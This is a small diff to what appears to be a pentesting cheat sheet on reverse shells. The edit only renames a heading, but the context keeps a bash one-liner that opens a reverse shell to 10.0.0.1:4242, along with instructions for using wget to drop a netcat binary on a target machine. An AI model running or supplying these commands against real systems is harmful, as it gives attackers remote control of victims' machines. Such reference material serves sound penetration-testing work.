@@ -82,7 +82,7 @@ Usually associated with redis
 bash -c "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"
 ```
 
-#### Simple Reverse Shell (NC)
+#### Simple Reverse Shell (netcat)
 One simple way to get a reverse shell on the target machine is using netcat. First, we need to make sure that the target's machine has it installed. If not, we can drop a nc.exe binary on our target machine using ```wget```. For windows machines, this binary can be found in ```usr/share/windows-binaries```.
 
 ##### Getting our nc.exe binary on the target machine
